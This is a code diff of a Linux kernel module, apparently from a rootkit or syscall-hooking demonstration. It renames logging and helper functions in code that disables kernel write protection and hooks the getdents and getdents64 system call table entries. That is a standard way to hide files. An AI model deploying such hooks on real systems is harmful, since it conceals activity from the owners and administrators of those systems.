@@ -56,15 +56,15 @@ fake_getdents64(unsigned int fd,
 int
 init_module(void)
 {
-  pr_alert("%s\n", "Greetings the World!");
+  fm_alert("%s\n", "Greetings the World!");
 
   /* No consideration on failure. */
-  real_sys_call_table = get_sys_call_table();
+  real_sys_call_table = get_sct();
 
-  disable_write_protection();
+  disable_wp();
   HOOK_SYS_CALL_TABLE(getdents);
   HOOK_SYS_CALL_TABLE(getdents64);
-  enable_write_protection();
+  enable_wp();
 
   return 0;
 }
@@ -73,12 +73,12 @@ init_module(void)
 void
 cleanup_module(void)
 {
-  disable_write_protection();
+  disable_wp();
   UNHOOK_SYS_CALL_TABLE(getdents);
   UNHOOK_SYS_CALL_TABLE(getdents64);
-  enable_write_protection();
+  enable_wp();
 
-  pr_alert("%s\n", "Farewell the World!");
+  fm_alert("%s\n", "Farewell the World!");
 
   return;
 }
@@ -109,7 +109,7 @@ fake_getdents64(unsigned int fd,
 {
   long ret;
 
-  pr_alert("==> %s\n", __func__);
+  fm_alert("==> %s\n", __func__);
 
   ret = real_getdents64(fd, dirent, count);
 
